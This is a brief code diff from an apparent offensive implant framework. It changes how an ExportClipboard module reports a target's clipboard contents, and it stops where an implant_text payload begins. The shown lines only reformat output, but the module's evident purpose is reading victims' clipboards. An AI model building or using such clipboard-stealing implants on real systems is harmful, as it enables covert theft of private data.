@@ -7,7 +7,7 @@ class ExportClipboard:
         if data.decode() == "2":
             return "Clipboard is empty (Or contained only '2')", None
         else:
-            return data.decode(), None
+            return f"Clipboard contents:\n{data.decode()}", None
 
     def implant_text(self):
         var ='''
